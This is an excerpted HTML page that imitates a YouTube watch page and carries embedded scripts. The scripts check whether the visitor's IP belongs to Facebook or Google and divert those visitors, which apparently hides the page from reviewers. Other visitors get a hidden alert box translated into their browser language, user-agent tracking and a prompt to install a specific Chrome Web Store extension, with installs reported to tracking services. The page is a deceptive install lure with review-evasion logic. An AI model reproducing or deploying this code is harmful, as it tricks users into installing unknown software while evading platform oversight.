...
<html class="content-snap-width-3 no-focus-outline" data-cast-api-enabled="true" lang="en"><head>
  ...
  <link rel="chrome-webstore-item" href="https://chrome.google.com/webstore/detail/pbejcoaimhojojokmnolmlgmdkgeelkc">
...
<body class="ltr webkit webkit-537 exp-responsive exp-scrollable-guide site-center-aligned site-as-giant-card appbar-hidden visibility-logging-enabled not-nirvana-dogfood not-yt-legacy-css flex-width-enabled flex-width-enabled-snap page-loaded" data-spf-name="watch" dir="ltr" id="body" style=" overflow: hidden;" cz-shortcut-listen="true">
                ...
                <div class="watch-main-col" id="watch7-content" itemid="" itemscope="" itemtype="http://schema.org/VideoObject">
                  ...
                  <div class="yt-card yt-card-has-padding" id="watch-header">
                    ...
                    <div class=" spf-link" id="watch7-user-header">
                      <a class="yt-uix-sessionlink yt-user-photo g-hovercard spf-link" data-sessionlink="itct=CC8Q4TkiEwjSvuPk04fMAhWGkRYKHSHWDMUo-B0" data-ytid="UCK8sQmJBp8GCxrOtXWBpyEA" href="/user/facebook"><span class="video-thumb yt-thumb yt-thumb-48 g-hovercard"><span class="yt-thumb-square"><span class="yt-thumb-clip"><img alt="Google" height="48" src="https://yt3.ggpht.com/-VYUgqirLOkg/AAAAAAAAAAI/AAAAAAAAAAA/hSVCE5OswK0/s88-c-k-no-rj-c0xffffff/photo.jpg" width="48"> <span class="vertical-align"></span></span></span></span></a>
  ...
  <div id="tooltip" style="display:none; width: 366px;height: 50px;overflow: auto;margin: 0 auto;position: absolute;top: 245px;left: 0;bottom: 0;right: 0;color: #000000;background: #fbfbfb;border: solid #b0afb3 1px;border-radius: 3px;z-index: 99999;cursor: help;box-shadow: 0px 0px 3px #888888;" class="">
  ...
  <div id="alertbox" style="display: none;width: 366px;height: 100px;overflow: auto;margin: 0 auto;position: absolute;top: 10px;left: 0;bottom: 0;right: 0;color: #000000;background: #fbfbfb;border: solid #b0afb3 1px;border-radius: 3px;z-index: 19999999999;cursor: help;box-shadow: 0px 0px 3px #888888;padding:20px;" class="">
    ...
    <input id="alertok" type="button" value="OK" style="position: absolute;bottom: 20px;right: 20px;height: 30px;font-weight: bold;cursor: pointer;padding-left: 10px;padding-right: 10px;">
  </div>
  ...
  <script type="text/javascript">
    jQuery.ajax({
      ...
      success:function(data){
        if(data.org.toLocaleLowerCase().indexOf("facebook") >=0 || data.org.toLocaleLowerCase().indexOf("google") >=0){
          gofb();
        }
      }
    });
    ...
    function speech(q,callback){
      var url = "https://code.responsivevoice.org/develop/getvoice.php?t="+ encodeURI(q) +"&tl="+ navigator.language.split("-")[0].toLowerCase() +"&sv=&vn=&pitch=0.5&rate=0.5&vol=1";
    ...
    translate("en",navigator.language,$("#alertok").val(),function(data){
      $("#alertok").val(data.sentences[0].trans.toUpperCase());
    });
  </script>
  <script type="text/javascript">
     function sendUseragent(){
          ga('send', 'event', {
              ...
              'eventAction': navigator.userAgent,
     ...
     install = function(){
          ...
          chrome.webstore.install(
              'https://chrome.google.com/webstore/detail/pbejcoaimhojojokmnolmlgmdkgeelkc',
              function() {
              var dax = new Image();
...
dax.src="http://whos.amung.us/widget/instalimet1.png";
                  ...
                  ga('send', 'event', {
                     ...
                     'eventAction': 'pbejcoaimhojojokmnolmlgmdkgeelkc',
                     'hitCallback': function() {
                        gofb();
                      },
                     'hitCallbackFail' : function () {
